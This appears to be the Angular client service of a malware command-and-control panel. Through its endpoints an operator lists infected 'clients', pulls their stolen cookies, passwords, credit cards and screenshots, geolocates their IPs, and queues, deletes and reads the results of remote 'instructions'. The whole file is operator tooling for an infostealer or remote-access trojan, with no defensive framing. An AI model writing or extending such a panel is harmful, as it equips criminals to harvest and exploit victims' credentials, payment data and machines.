import { HttpClient, HttpHeaders } from '@angular/common/http';
import { Injectable } from '@angular/core';
import { AuthService } from '../../auth/services/auth.service';
import { Router } from '@angular/router';
import { environment } from '../../../environments/environment';
import { Observable } from 'rxjs';
import { ClientInfo } from '../models/clientInfo.module';
import { Cookie } from '../models/cookie.module';
import { CreditCard } from '../models/creditCard.module';
import { Password } from '../models/password.module';
import { ClientSettings } from '../models/clientSettings.module';
import { Screens } from '../models/screenshots.module';
import { Instruction } from '../models/instruction.module';
import { Result } from '../models/response.module';
import { IpInfo } from '../models/ipdata.module';
@Injectable({
  providedIn: 'root'
})
export class ClientService {
  private endPoint = environment.apiUrl+"Client";
  private token = this.authService.getToken();
  private httpOptions = {
    headers: new HttpHeaders({
      'Content-Type': 'application/json',
      'Authorization': ''+this.token
    })
  };
  constructor(private router:Router,private httpClient:HttpClient,private authService:AuthService ) {}
  getNewInstructionID(): Observable<number>|null {
    
    return this.httpClient.get<number>(environment.apiUrl+"Instruction/id", this.httpOptions);
  }
  getAllClients(): Observable<ClientInfo[]>|null {
    if(this.token==null){
      this.router.navigate(["/"]);
      return null;
    }
    return this.httpClient.get<ClientInfo[]>(this.endPoint, this.httpOptions);
  }
  getClient(id:string): Observable<ClientInfo>|null {
    if(this.token==null){
      this.router.navigate(["/"]);
      return null;
    }
    return this.httpClient.get<ClientInfo>(this.endPoint+"/"+id, this.httpOptions);
  }
  getIpInfo(ip:string):Observable<IpInfo>{
    return this.httpClient.get<IpInfo>("http://ip-api.com/json/"+ip+"?fields=country,city,isp");

  }
  getClientCookies(id:string): Observable<Cookie[]>|null {
    if(this.token==null){
      this.router.navigate(["/"]);
      return null;
    }
    return this.httpClient.get<Cookie[]>(this.endPoint+"/Cookies/"+id, this.httpOptions);
  }
  getClientCreditCards(id:string): Observable<CreditCard[]>|null {
    if(this.token==null){
      this.router.navigate(["/"]);
      return null;
    }
    return this.httpClient.get<CreditCard[]>(this.endPoint+"/CreditCards/"+id, this.httpOptions);
  }
   
  getClientPasswords(id:string): Observable<Password[]>|null {
    if(this.token==null){
      this.router.navigate(["/"]);
      return null;
    }
    return this.httpClient.get<Password[]>(this.endPoint+"/Passwords/"+id, this.httpOptions);
  }
  updateSettings(id:string,settings:ClientSettings):Observable<any>|null{
    if(this.token==null){
      this.router.navigate(["/"]);
      return null;
    }
    return this.httpClient.patch<any>(this.endPoint+"/Settings/"+id, settings,this.httpOptions);
  }
  getClientScreenshots(id:string): Observable<Screens>|null {
    if(this.token==null){
      this.router.navigate(["/"]);
      return null;
    }
    return this.httpClient.get<Screens>(this.endPoint+"/Screenshots/"+id, this.httpOptions);
  }
  getClientScreenshot(id: string, imageFileName: string, ScreenIndex: number): Observable<Blob> | null {
    if (this.token == null) {
      this.router.navigate(["/"]); 
      return null;
    }
    
    return this.httpClient.get(
      `${this.endPoint}/Screenshots/${id}/${ScreenIndex}/${imageFileName}`, 
      { 
        responseType: 'blob',
        headers: new HttpHeaders({
          'Authorization': `Bearer ${this.token}`
        })
      }
    );
  }
  getClientScreenshotPreview(id: string, imageFileName: string, ScreenIndex: number): Observable<Blob> | null {
    if (this.token == null) {
      this.router.navigate(["/"]); 
      return null;
    }
    
    return this.httpClient.get(
      `${this.endPoint}/Screenshots/Preview/${id}/${ScreenIndex}/${imageFileName}`, 
      { 
        responseType: 'blob',
        headers: new HttpHeaders({
          'Authorization': `Bearer ${this.token}`
        })
      }
    );
  }
  getClientActions(id:string): Observable<Instruction[]>|null {
    if(this.token==null){
      this.router.navigate(["/"]);
      return null;
    }
    return this.httpClient.get<Instruction[]>( environment.apiUrl+"Instruction/"+id, this.httpOptions);
  }
  DeleteClientAction(id:string,InstructionId:number): Observable<any>|null {
    if(this.token==null){
      this.router.navigate(["/"]);
      return null;
    }
    return this.httpClient.delete<any>( environment.apiUrl+"Instruction/"+id+"/"+InstructionId, this.httpOptions);
  }
  DeleteClientAllAction(id:string): Observable<any>|null {
    if(this.token==null){
      this.router.navigate(["/"]);
      return null;
    }
    return this.httpClient.delete<any>( environment.apiUrl+"Instruction/"+id, this.httpOptions);
  }
  CreateClientAction(id:string,data:any): Observable<any>|null {
    if(this.token==null){
      this.router.navigate(["/"]);
      return null;
    }
    return this.httpClient.post<any>( environment.apiUrl+"Instruction/"+id,data, this.httpOptions);
  }
  GetClientResults(id:string): Observable<Result[]>|null {
    if(this.token==null){
      this.router.navigate(["/"]);
      return null;
    }
    return this.httpClient.get<Result[]>( environment.apiUrl+"Response/"+id, this.httpOptions);
  }
}
